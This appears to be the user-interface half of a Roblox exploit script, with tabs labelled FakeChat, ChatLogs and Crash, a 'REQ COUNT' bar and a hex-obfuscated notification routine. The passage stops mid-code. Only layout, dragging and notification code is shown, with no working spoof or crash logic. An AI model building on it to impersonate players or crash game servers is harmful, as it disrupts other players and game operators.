-- Gui to Lua
-- Version: 3.2

-- Instances:

local ui = Instance.new("ScreenGui")
local UITabs = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Tab = Instance.new("Frame")
local FakeChat = Instance.new("Frame")
local Box0 = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Border = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local Message = Instance.new("TextBox")
local message = Instance.new("ImageButton")
local Box1 = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local Name2 = Instance.new("TextBox")
local name = Instance.new("ImageButton")
local Border_2 = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local Box2 = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local Text = Instance.new("TextButton")
local speak = Instance.new("ImageButton")
local Border_3 = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local ChatLogs = Instance.new("Frame")
local Box0_2 = Instance.new("Frame")
local UICorner_8 = Instance.new("UICorner")
local Text_2 = Instance.new("TextButton")
local speak_2 = Instance.new("ImageButton")
local Border_4 = Instance.new("Frame")
local UICorner_9 = Instance.new("UICorner")
local Box1_2 = Instance.new("Frame")
local UICorner_10 = Instance.new("UICorner")
local req = Instance.new("ImageButton")
local Text_3 = Instance.new("TextLabel")
local Bar = Instance.new("Frame")
local Text_4 = Instance.new("TextLabel")
local UIGradient = Instance.new("UIGradient")
local Border_5 = Instance.new("Frame")
local Border_6 = Instance.new("Frame")
local UICorner_11 = Instance.new("UICorner")
local Crash = Instance.new("Frame")
local Box0_3 = Instance.new("Frame")
local UICorner_12 = Instance.new("UICorner")
local Text_5 = Instance.new("TextButton")
local speak_3 = Instance.new("ImageButton")
local Border_7 = Instance.new("Frame")
local UICorner_13 = Instance.new("UICorner")
local Top = Instance.new("Frame")
local Bottom = Instance.new("Frame")
local Buttons = Instance.new("Frame")
local Close = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local Default = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local Mini = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local UICorner_17 = Instance.new("UICorner")
local UIList = Instance.new("Frame")
local UICorner_18 = Instance.new("UICorner")
local Top_2 = Instance.new("Frame")
local Bottom_2 = Instance.new("Frame")
local UICorner_19 = Instance.new("UICorner")
local Box = Instance.new("Frame")
local Border_8 = Instance.new("Frame")
local UICorner_20 = Instance.new("UICorner")
local UICorner_21 = Instance.new("UICorner")
local Text_6 = Instance.new("TextBox")

--Properties:

ui.Name = "ui"
ui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ui.ResetOnSpawn = false

UITabs.Name = "UITabs"
UITabs.Parent = ui
UITabs.BackgroundColor3 = Color3.fromRGB(52, 56, 71)
UITabs.BorderColor3 = Color3.fromRGB(33, 32, 71)
UITabs.Position = UDim2.new(0.0250000004, 0, 0.200000003, 0)
UITabs.Size = UDim2.new(0, 390, 0, 500)
UITabs.ZIndex = 0

local stroke = Instance.new("UIStroke")
stroke.Parent = UITabs
stroke.Thickness = 3
stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
stroke.Color = Color3.fromRGB(35, 37, 49)
stroke.Transparency = 0.7

UICorner.CornerRadius = UDim.new(0, 5)
UICorner.Parent = UITabs

Tab.Name = "Tab"
Tab.Parent = UITabs
Tab.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab.BackgroundTransparency = 1.000
Tab.Position = UDim2.new(0, 0, 0, 30)
Tab.Size = UDim2.new(0, 390, 0, 320)

FakeChat.Name = "FakeChat"
FakeChat.Parent = Tab
FakeChat.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FakeChat.BackgroundTransparency = 1.000
FakeChat.Size = UDim2.new(1.00000012, 0, 1, 0)

Box0.Name = "Box0"
Box0.Parent = FakeChat
Box0.BackgroundColor3 = Color3.fromRGB(47, 41, 71)
Box0.BorderColor3 = Color3.fromRGB(0, 0, 0)
Box0.BorderSizePixel = 0
Box0.Position = UDim2.new(0.5, -150, 0, 40)
Box0.Size = UDim2.new(0, 300, 0, 40)
Box0.ZIndex = 3

UICorner_2.CornerRadius = UDim.new(0, 5)
UICorner_2.Parent = Box0

Border.Name = "Border"
Border.Parent = Box0
Border.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Border.BackgroundTransparency = 0.700
Border.BorderColor3 = Color3.fromRGB(255, 255, 255)
Border.BorderSizePixel = 0
Border.Position = UDim2.new(0, -1, 0, -1)
Border.Size = UDim2.new(1, 2, 1, 2)
Border.ZIndex = 2

UICorner_3.CornerRadius = UDim.new(0, 5)
UICorner_3.Parent = Border

Message.Name = "Message"
Message.Parent = Box0
Message.Active = false
Message.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Message.BackgroundTransparency = 1.000
Message.Size = UDim2.new(1, 0, 1, 0)
Message.ZIndex = 4
Message.ClearTextOnFocus = false
Message.Font = Enum.Font.Ubuntu
Message.PlaceholderColor3 = Color3.fromRGB(169, 147, 255)
Message.PlaceholderText = "Message"
Message.Text = ""
Message.TextColor3 = Color3.fromRGB(169, 147, 255)
Message.TextSize = 23.000
Message.TextTransparency = 1.000

message.Name = "message"
message.Parent = Box0
message.BackgroundTransparency = 1.000
message.Position = UDim2.new(-0.109999999, 0, -0.100000001, 0)
message.Size = UDim2.new(0, 25, 0, 25)
message.ZIndex = 3
message.Image = "rbxassetid://3926305904"
message.ImageRectOffset = Vector2.new(564, 564)
message.ImageRectSize = Vector2.new(36, 36)
message.ImageTransparency = 0.150

Box1.Name = "Box1"
Box1.Parent = FakeChat
Box1.BackgroundColor3 = Color3.fromRGB(47, 41, 71)
Box1.BorderColor3 = Color3.fromRGB(0, 0, 0)
Box1.BorderSizePixel = 0
Box1.Position = UDim2.new(0.5, -150, 0, 100)
Box1.Size = UDim2.new(0, 300, 0, 40)
Box1.ZIndex = 3

UICorner_4.CornerRadius = UDim.new(0, 5)
UICorner_4.Parent = Box1

Name2.Name = "Name2"
Name2.Parent = Box1
Name2.Active = false
Name2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Name2.BackgroundTransparency = 1.000
Name2.Size = UDim2.new(1, 0, 1, 0)
Name2.ZIndex = 4
Name2.ClearTextOnFocus = false
Name2.Font = Enum.Font.Ubuntu
Name2.PlaceholderColor3 = Color3.fromRGB(169, 147, 255)
Name2.PlaceholderText = "Name"
Name2.Text = ""
Name2.TextColor3 = Color3.fromRGB(169, 147, 255)
Name2.TextSize = 23.000
Name2.TextTransparency = 1.000

name.Name = "name"
name.Parent = Box1
name.BackgroundTransparency = 1.000
name.Position = UDim2.new(-0.109999999, 0, -0.100000001, 0)
name.Size = UDim2.new(0, 25, 0, 25)
name.ZIndex = 3
name.Image = "rbxassetid://3926307971"
name.ImageRectOffset = Vector2.new(884, 4)
name.ImageRectSize = Vector2.new(36, 36)
name.ImageTransparency = 0.150

Border_2.Name = "Border"
Border_2.Parent = Box1
Border_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Border_2.BackgroundTransparency = 0.700
Border_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
Border_2.BorderSizePixel = 0
Border_2.Position = UDim2.new(0, -1, 0, -1)
Border_2.Size = UDim2.new(1, 2, 1, 2)
Border_2.ZIndex = 2

UICorner_5.CornerRadius = UDim.new(0, 5)
UICorner_5.Parent = Border_2

Box2.Name = "Box2"
Box2.Parent = FakeChat
Box2.BackgroundColor3 = Color3.fromRGB(47, 41, 71)
Box2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Box2.BorderSizePixel = 0
Box2.Position = UDim2.new(0.5, -70, 0, 220)
Box2.Size = UDim2.new(0, 150, 0, 40)
Box2.ZIndex = 3

UICorner_6.CornerRadius = UDim.new(0, 5)
UICorner_6.Parent = Box2

Text.Name = "Text"
Text.Parent = Box2
Text.Active = false
Text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text.BackgroundTransparency = 1.000
Text.Size = UDim2.new(1, 0, 1, 0)
Text.ZIndex = 3
Text.AutoButtonColor = false
Text.Font = Enum.Font.Ubuntu
Text.Text = "Speak"
Text.TextColor3 = Color3.fromRGB(169, 147, 255)
Text.TextSize = 23.000

speak.Name = "speak"
speak.Parent = Box2
speak.BackgroundTransparency = 1.000
speak.Position = UDim2.new(-0.189999998, 0, -0.100000001, 0)
speak.Rotation = -90.000
speak.Size = UDim2.new(0, 25, 0, 25)
speak.ZIndex = 3
speak.Image = "rbxassetid://3926307971"
speak.ImageRectOffset = Vector2.new(4, 284)
speak.ImageRectSize = Vector2.new(36, 36)
speak.ImageTransparency = 0.150

Border_3.Name = "Border"
Border_3.Parent = Box2
Border_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Border_3.BackgroundTransparency = 0.700
Border_3.BorderColor3 = Color3.fromRGB(255, 255, 255)
Border_3.BorderSizePixel = 0
Border_3.Position = UDim2.new(0, -1, 0, -1)
Border_3.Size = UDim2.new(1, 2, 1, 2)
Border_3.ZIndex = 2

UICorner_7.CornerRadius = UDim.new(0, 5)
UICorner_7.Parent = Border_3

ChatLogs.Name = "ChatLogs"
ChatLogs.Parent = Tab
ChatLogs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ChatLogs.BackgroundTransparency = 1.000
ChatLogs.Position = UDim2.new(-1.95625507e-08, 0, 0, 0)
ChatLogs.Size = UDim2.new(1.00000012, 0, 1, 0)
ChatLogs.Visible = false

Box0_2.Name = "Box0"
Box0_2.Parent = ChatLogs
Box0_2.BackgroundColor3 = Color3.fromRGB(47, 41, 71)
Box0_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Box0_2.BorderSizePixel = 0
Box0_2.Position = UDim2.new(0.5, -70, 0, 20)
Box0_2.Size = UDim2.new(0, 150, 0, 40)
Box0_2.ZIndex = 3

UICorner_8.CornerRadius = UDim.new(0, 5)
UICorner_8.Parent = Box0_2

Text_2.Name = "Text"
Text_2.Parent = Box0_2
Text_2.Active = false
Text_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text_2.BackgroundTransparency = 1.000
Text_2.Size = UDim2.new(1, 0, 1, 0)
Text_2.ZIndex = 3
Text_2.AutoButtonColor = false
Text_2.Font = Enum.Font.Ubuntu
Text_2.Text = "STRT"
Text_2.TextColor3 = Color3.fromRGB(169, 147, 255)
Text_2.TextSize = 23.000

speak_2.Name = "speak"
speak_2.Parent = Box0_2
speak_2.BackgroundTransparency = 1.000
speak_2.Position = UDim2.new(-0.189999998, 0, -0.100000001, 0)
speak_2.Size = UDim2.new(0, 25, 0, 25)
speak_2.ZIndex = 3
speak_2.Image = "rbxassetid://3926305904"
speak_2.ImageRectOffset = Vector2.new(884, 84)
speak_2.ImageRectSize = Vector2.new(36, 36)
speak_2.ImageTransparency = 0.150

Border_4.Name = "Border"
Border_4.Parent = Box0_2
Border_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Border_4.BackgroundTransparency = 0.700
Border_4.BorderColor3 = Color3.fromRGB(255, 255, 255)
Border_4.BorderSizePixel = 0
Border_4.Position = UDim2.new(0, -1, 0, -1)
Border_4.Size = UDim2.new(1, 2, 1, 2)
Border_4.ZIndex = 2

UICorner_9.CornerRadius = UDim.new(0, 5)
UICorner_9.Parent = Border_4

Box1_2.Name = "Box1"
Box1_2.Parent = ChatLogs
Box1_2.BackgroundColor3 = Color3.fromRGB(47, 41, 71)
Box1_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Box1_2.BorderSizePixel = 0
Box1_2.Position = UDim2.new(0.5, -70, 0, 100)
Box1_2.Size = UDim2.new(0, 150, 0, 20)
Box1_2.ZIndex = 3

UICorner_10.CornerRadius = UDim.new(0, 5)
UICorner_10.Parent = Box1_2

req.Name = "req"
req.Parent = Box1_2
req.BackgroundTransparency = 1.000
req.Position = UDim2.new(-0.189999998, 0, -0.100000001, 0)
req.Size = UDim2.new(0, 25, 0, 25)
req.ZIndex = 3
req.Image = "rbxassetid://3926305904"
req.ImageRectOffset = Vector2.new(844, 244)
req.ImageRectSize = Vector2.new(36, 36)
req.ImageTransparency = 0.150

Text_3.Name = "Text"
Text_3.Parent = Box1_2
Text_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text_3.BackgroundTransparency = 1.000
Text_3.Position = UDim2.new(0, 0, 0, -30)
Text_3.Size = UDim2.new(0, 150, 0, 20)
Text_3.ZIndex = 3
Text_3.Font = Enum.Font.Ubuntu
Text_3.Text = "REQ COUNT"
Text_3.TextColor3 = Color3.fromRGB(255, 190, 221)
Text_3.TextSize = 17.000

Bar.Name = "Bar"
Bar.Parent = Box1_2
Bar.BackgroundColor3 = Color3.fromRGB(25, 255, 125)
Bar.BackgroundTransparency = 0.300
Bar.BorderColor3 = Color3.fromRGB(0, 0, 0)
Bar.BorderSizePixel = 0
Bar.Size = UDim2.new(0, 0, 1, 0)
Bar.ZIndex = 3

Text_4.Name = "Text"
Text_4.Parent = Bar
Text_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text_4.BackgroundTransparency = 1.000
Text_4.Position = UDim2.new(0, 0, 0, -30)
Text_4.Size = UDim2.new(0, 150, 0, 20)
Text_4.ZIndex = 3
Text_4.Font = Enum.Font.Ubuntu
Text_4.Text = "REQ COUNT"
Text_4.TextColor3 = Color3.fromRGB(169, 147, 255)
Text_4.TextSize = 17.000

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(189, 141, 164)), ColorSequenceKeypoint.new(0.35, Color3.fromRGB(205, 153, 178)), ColorSequenceKeypoint.new(0.35, Color3.fromRGB(255, 190, 221)), ColorSequenceKeypoint.new(0.40, Color3.fromRGB(255, 190, 221)), ColorSequenceKeypoint.new(0.40, Color3.fromRGB(255, 190, 221)), ColorSequenceKeypoint.new(0.40, Color3.fromRGB(189, 141, 164)), ColorSequenceKeypoint.new(0.45, Color3.fromRGB(189, 141, 164)), ColorSequenceKeypoint.new(0.45, Color3.fromRGB(255, 190, 221)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 190, 221))}
UIGradient.Rotation = -90
UIGradient.Parent = Bar

Border_5.Name = "Border"
Border_5.Parent = Bar
Border_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Border_5.BackgroundTransparency = 0.700
Border_5.BorderColor3 = Color3.fromRGB(255, 255, 255)
Border_5.BorderSizePixel = 0
Border_5.Position = UDim2.new(0, -1, 0, -1)
Border_5.Size = UDim2.new(1, 2, 1, 2)
Border_5.ZIndex = 2

Border_6.Name = "Border"
Border_6.Parent = Box1_2
Border_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Border_6.BackgroundTransparency = 0.700
Border_6.BorderColor3 = Color3.fromRGB(255, 255, 255)
Border_6.BorderSizePixel = 0
Border_6.Position = UDim2.new(0, -1, 0, -1)
Border_6.Size = UDim2.new(1, 2, 1, 2)
Border_6.ZIndex = 2

UICorner_11.CornerRadius = UDim.new(0, 5)
UICorner_11.Parent = Border_6

Crash.Name = "Crash"
Crash.Parent = Tab
Crash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Crash.BackgroundTransparency = 1.000
Crash.Size = UDim2.new(1.00000012, 0, 1, 0)
Crash.Visible = false

Box0_3.Name = "Box0"
Box0_3.Parent = Crash
Box0_3.BackgroundColor3 = Color3.fromRGB(47, 41, 71)
Box0_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
Box0_3.BorderSizePixel = 0
Box0_3.Position = UDim2.new(0.5, -70, 0, 20)
Box0_3.Size = UDim2.new(0, 150, 0, 40)
Box0_3.ZIndex = 3

UICorner_12.CornerRadius = UDim.new(0, 5)
UICorner_12.Parent = Box0_3

Text_5.Name = "Text"
Text_5.Parent = Box0_3
Text_5.Active = false
Text_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text_5.BackgroundTransparency = 1.000
Text_5.Size = UDim2.new(1, 0, 1, 0)
Text_5.ZIndex = 3
Text_5.AutoButtonColor = false
Text_5.Font = Enum.Font.Ubuntu
Text_5.Text = "CRSH"
Text_5.TextColor3 = Color3.fromRGB(169, 147, 255)
Text_5.TextSize = 23.000

speak_3.Name = "speak"
speak_3.Parent = Box0_3
speak_3.BackgroundTransparency = 1.000
speak_3.Position = UDim2.new(-0.189999998, 0, -0.100000001, 0)
speak_3.Size = UDim2.new(0, 25, 0, 25)
speak_3.ZIndex = 3
speak_3.Image = "rbxassetid://3926305904"
speak_3.ImageRectOffset = Vector2.new(364, 324)
speak_3.ImageRectSize = Vector2.new(36, 36)
speak_3.ImageTransparency = 0.150

Border_7.Name = "Border"
Border_7.Parent = Box0_3
Border_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Border_7.BackgroundTransparency = 0.700
Border_7.BorderColor3 = Color3.fromRGB(255, 255, 255)
Border_7.BorderSizePixel = 0
Border_7.Position = UDim2.new(0, -1, 0, -1)
Border_7.Size = UDim2.new(1, 2, 1, 2)
Border_7.ZIndex = 2

UICorner_13.CornerRadius = UDim.new(0, 5)
UICorner_13.Parent = Border_7

Top.Name = "Top"
Top.Parent = UITabs
Top.BackgroundColor3 = Color3.fromRGB(47, 41, 71)
Top.BorderColor3 = Color3.fromRGB(68, 68, 8614)
Top.Size = UDim2.new(1, 0, 0.0599999987, 0)

Bottom.Name = "Bottom"
Bottom.Parent = Top
Bottom.BackgroundColor3 = Color3.fromRGB(47, 41, 71)
Bottom.BorderColor3 = Color3.fromRGB(68, 68, 8614)
Bottom.BorderSizePixel = 0
Bottom.Position = UDim2.new(0, 0, 0.649999976, 0)
Bottom.Size = UDim2.new(1, 0, 0, 15)

Buttons.Name = "Buttons"
Buttons.Parent = Top
Buttons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Buttons.BackgroundTransparency = 1.000
Buttons.Size = UDim2.new(1.66666663, 0, 1, 0)
Buttons.ZIndex = 3

Close.Name = "Close"
Close.Parent = Buttons
Close.Active = false
Close.BackgroundColor3 = Color3.fromRGB(255, 50, 140)
Close.BorderColor3 = Color3.fromRGB(255, 50, 140)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0.0850000009, 0, 0.25, 0)
Close.Size = UDim2.new(0, 15, 0, 15)
Close.ZIndex = 3
Close.AutoButtonColor = false
Close.Font = Enum.Font.Ubuntu
Close.Text = ""
Close.TextColor3 = Color3.fromRGB(0, 0, 0)
Close.TextSize = 14.000

UICorner_14.CornerRadius = UDim.new(0, 5)
UICorner_14.Parent = Close

Default.Name = "Default"
Default.Parent = Buttons
Default.Active = false
Default.BackgroundColor3 = Color3.fromRGB(50, 255, 140)
Default.BorderColor3 = Color3.fromRGB(50, 255, 140)
Default.BorderSizePixel = 0
Default.Position = UDim2.new(0.0149999997, 0, 0.25, 0)
Default.Size = UDim2.new(0, 15, 0, 15)
Default.ZIndex = 3
Default.AutoButtonColor = false
Default.Font = Enum.Font.Ubuntu
Default.Text = ""
Default.TextColor3 = Color3.fromRGB(0, 0, 0)
Default.TextSize = 14.000

UICorner_15.CornerRadius = UDim.new(0, 5)
UICorner_15.Parent = Default

Mini.Name = "Mini"
Mini.Parent = Buttons
Mini.Active = false
Mini.BackgroundColor3 = Color3.fromRGB(255, 140, 80)
Mini.BorderColor3 = Color3.fromRGB(255, 140, 80)
Mini.BorderSizePixel = 0
Mini.Position = UDim2.new(0.0500000007, 0, 0.25, 0)
Mini.Size = UDim2.new(0, 15, 0, 15)
Mini.ZIndex = 3
Mini.AutoButtonColor = false
Mini.Font = Enum.Font.Ubuntu
Mini.Text = ""
Mini.TextColor3 = Color3.fromRGB(0, 0, 0)
Mini.TextSize = 14.000

UICorner_16.CornerRadius = UDim.new(0, 5)
UICorner_16.Parent = Mini

UICorner_17.CornerRadius = UDim.new(0, 5)
UICorner_17.Parent = Top

UIList.Name = "UIList"
UIList.Parent = ui
UIList.BackgroundColor3 = Color3.fromRGB(52, 56, 71)
UIList.BorderColor3 = Color3.fromRGB(33, 32, 71)
UIList.Position = UDim2.new(0.0500000007, 0, 0.899999976, 0)
UIList.Size = UDim2.new(0, 320, 0, 60)
UIList.ZIndex = 0

local stroke = Instance.new("UIStroke")
stroke.Parent = UIList
stroke.Thickness = 3
stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
stroke.Color = Color3.fromRGB(35, 37, 49)
stroke.Transparency = 0.7

UICorner_18.CornerRadius = UDim.new(0, 5)
UICorner_18.Parent = UIList

Top_2.Name = "Top"
Top_2.Parent = UIList
Top_2.BackgroundColor3 = Color3.fromRGB(47, 41, 71)
Top_2.BorderColor3 = Color3.fromRGB(68, 68, 8614)
Top_2.Size = UDim2.new(1, 0, 0.0599999987, 0)

Bottom_2.Name = "Bottom"
Bottom_2.Parent = Top_2
Bottom_2.BackgroundColor3 = Color3.fromRGB(47, 41, 71)
Bottom_2.BorderColor3 = Color3.fromRGB(68, 68, 8614)
Bottom_2.BorderSizePixel = 0
Bottom_2.Position = UDim2.new(0, 0, 0.649999976, 0)
Bottom_2.Size = UDim2.new(1, 0, 0, 15)

UICorner_19.CornerRadius = UDim.new(0, 5)
UICorner_19.Parent = Top_2

Box.Name = "Box"
Box.Parent = UIList
Box.BackgroundColor3 = Color3.fromRGB(47, 41, 71)
Box.BorderColor3 = Color3.fromRGB(0, 0, 0)
Box.BorderSizePixel = 0
Box.Position = UDim2.new(0.0500000007, 0, 0.5, 0)
Box.Size = UDim2.new(0, 290, 0, 20)
Box.ZIndex = 3

Border_8.Name = "Border"
Border_8.Parent = Box
Border_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Border_8.BackgroundTransparency = 0.700
Border_8.BorderColor3 = Color3.fromRGB(255, 255, 255)
Border_8.BorderSizePixel = 0
Border_8.Position = UDim2.new(0, -1, 0, -1)
Border_8.Size = UDim2.new(1, 2, 1, 2)
Border_8.ZIndex = 2

UICorner_20.CornerRadius = UDim.new(0, 5)
UICorner_20.Parent = Border_8

UICorner_21.CornerRadius = UDim.new(0, 5)
UICorner_21.Parent = Box

Text_6.Name = "Text"
Text_6.Parent = Box
Text_6.Active = false
Text_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text_6.BackgroundTransparency = 1.000
Text_6.Size = UDim2.new(1, 0, 1, 0)
Text_6.ZIndex = 4
Text_6.ClearTextOnFocus = false
Text_6.Font = Enum.Font.Ubuntu
Text_6.PlaceholderColor3 = Color3.fromRGB(152, 152, 152)
Text_6.PlaceholderText = "Search"
Text_6.Text = ""
Text_6.TextColor3 = Color3.fromRGB(152, 152, 152)
Text_6.TextSize = 14.000
Text_6.TextTransparency = 1.000

-- Scripts:

local function AGONEZM_fake_script() -- UITabs.Dragify 
	local script = Instance.new('LocalScript', UITabs)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
		dragToggle = nil
		local dragSpeed = 0
		dragInput = nil
		dragStart = nil
		local dragPos = nil
		function updateInput(input)
			local Delta = input.Position - dragStart
			local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
			game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.135, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = Position}):Play()
		end
		Frame.InputBegan:Connect(function(input)
			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
				dragToggle = true
				dragStart = input.Position
				startPos = Frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)
		Frame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
		game:GetService("UserInputService").InputChanged:Connect(function(input)
			if input == dragInput and dragToggle then
				updateInput(input)
			end
		end)
		game:GetService("RunService").Heartbeat:Connect(function()
			if dragToggle == false then
				game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Rotation = 0}):Play()
			end
			if dragToggle == true then
				game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Rotation = 5}):Play()
			end
		end)
	end

	dragify(script.Parent)
end
coroutine.wrap(AGONEZM_fake_script)()
local function CEVDAO_fake_script() -- UITabs.Notifications 
	local script = Instance.new('LocalScript', UITabs)

	function notif(CAoT2_arg1)
		local CAoT3_ = Instance.new("\x53\x63\x72\x65\x65\x6E\x47\x75\x69")
		local CAoT4_ = Instance.new("\x46\x72\x61\x6D\x65")
		local CAoT5_ = Instance.new("\x54\x65\x78\x74\x4C\x61\x62\x65\x6C")
		local CAoT6_ = Instance.new("\x46\x72\x61\x6D\x65")
		local CAoT7_ = Instance.new("\x54\x65\x78\x74\x42\x75\x74\x74\x6F\x6E")
		local CAoT8_ = Instance.new("\x55\x49\x43\x6F\x72\x6E\x65\x72")
		local CAoT9_ = Instance.new("\x54\x65\x78\x74\x4C\x61\x62\x65\x6C")
		local CAoT10_ = Instance.new("\x55\x49\x47\x72\x61\x64\x69\x65\x6E\x74")
		local CAoT11_ = Instance.new("\x55\x49\x43\x6F\x72\x6E\x65\x72")
		local CAoT12_ = Instance.new("\x46\x72\x61\x6D\x65")
		local CAoT13_ = Instance.new("\x55\x49\x43\x6F\x72\x6E\x65\x72")
		local CAoT14_ = Instance.new("\x55\x49\x53\x74\x72\x6F\x6B\x65")
		CAoT3_.Name = "\x6E\x6F\x74\x69\x66\x69\x63\x61\x74\x69\x6F\x6E"
		CAoT3_.Parent = game:GetService("\x50\x6C\x61\x79\x65\x72\x73").LocalPlayer:FindFirstChildWhichIsA("\x50\x6C\x61\x79\x65\x72\x47\x75\x69")
		CAoT3_.ResetOnSpawn = false
		CAoT4_.Name = "\x55\x49"
		CAoT4_.Parent = CAoT3_
		CAoT4_.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
		CAoT4_.BackgroundTransparency = 0.000
		CAoT4_.BorderColor3 = Color3.fromRGB(33, 32, 71)
		CAoT4_.ClipsDescendants = true
		CAoT4_.Position = UDim2.new(-0.200000003, 0, 0.850000024, 0)
		CAoT4_.Size = UDim2.new(0, 0, 0, 90)
		CAoT4_.ZIndex = 0
		CAoT14_.Parent = CAoT4_
		CAoT14_.Transparency = 1
		CAoT14_.Thickness = 3
		CAoT14_.Color = Color3.fromRGB(35, 37, 49)
		CAoT14_.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
		CAoT5_.Name = "\x4C\x61\x62\x65\x6C"
		CAoT5_.Parent = CAoT4_
		CAoT5_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		CAoT5_.BackgroundTransparency = 1.000
		CAoT5_.Position = UDim2.new(0.0500000007, 0, 0.194000006, 0)
		CAoT5_.Size = UDim2.new(0.949999988, 0, 0.805999994, 0)
		CAoT5_.Font = Enum.Font.Ubuntu
		CAoT5_.Text = CAoT2_arg1
		CAoT5_.TextColor3 = Color3.fromRGB(25, 255, 125)
		CAoT5_.TextSize = 15.000
		CAoT5_.TextStrokeColor3 = Color3.fromRGB(25, 255, 125)
		CAoT5_.TextWrapped = true
		CAoT5_.TextXAlignment = Enum.TextXAlignment.Left
		CAoT5_.TextYAlignment = Enum.TextYAlignment.Top
		CAoT6_.Name = "\x54\x6F\x70"
		CAoT6_.Parent = CAoT4_
		CAoT6_.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
		CAoT6_.BorderColor3 = Color3.fromRGB(25, 25, 25)
		CAoT6_.Size = UDim2.new(1, 0, 0, 15)
		CAoT7_.Name = "\x44\x65\x66\x61\x75\x6C\x74"
		CAoT7_.Parent = CAoT6_
		CAoT7_.Active = false
		CAoT7_.BackgroundColor3 = Color3.fromRGB(50, 255, 140)
		CAoT7_.BorderColor3 = Color3.fromRGB(50, 255, 140)
		CAoT7_.BorderSizePixel = 0
		CAoT7_.Position = UDim2.new(0.0149999997, 0, 0.25, 0)
		CAoT7_.Size = UDim2.new(0, 7, 0, 7)
		CAoT7_.ZIndex = 3
		CAoT7_.AutoButtonColor = false
		CAoT7_.Font = Enum.Font.Ubuntu
		CAoT7_.Text = ""
		CAoT7_.TextColor3 = Color3.fromRGB(0, 0, 0)
		CAoT7_.TextSize = 14.000
		CAoT8_.CornerRadius = UDim.new(0, 5)
		CAoT8_.Parent = CAoT7_
		CAoT9_.Name = "\x4C\x61\x62\x65\x6C"
		CAoT9_.Parent = CAoT6_
		CAoT9_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		CAoT9_.BackgroundTransparency = 1.000
		CAoT9_.Size = UDim2.new(1, 0, 1, 0)
		CAoT9_.Font = Enum.Font.Ubuntu
		CAoT9_.Text = "\x2B\x2B\x2B"
		CAoT9_.TextColor3 = Color3.fromRGB(25, 255, 125)
		CAoT9_.TextSize = 17.000
		CAoT9_.TextStrokeColor3 = Color3.fromRGB(25, 255, 125)
		CAoT10_.Color = ColorSequence.new{
			ColorSequenceKeypoint.new(0.00, Color3.fromRGB(189, 141, 164)),
			ColorSequenceKeypoint.new(0.35, Color3.fromRGB(205, 153, 178)),
			ColorSequenceKeypoint.new(0.35, Color3.fromRGB(255, 190, 221)),
			ColorSequenceKeypoint.new(0.40, Color3.fromRGB(255, 190, 221)),
			ColorSequenceKeypoint.new(0.40, Color3.fromRGB(255, 190, 221)),
			ColorSequenceKeypoint.new(0.40, Color3.fromRGB(189, 141, 164)),
			ColorSequenceKeypoint.new(0.45, Color3.fromRGB(189, 141, 164)),
			ColorSequenceKeypoint.new(0.45, Color3.fromRGB(255, 190, 221)),
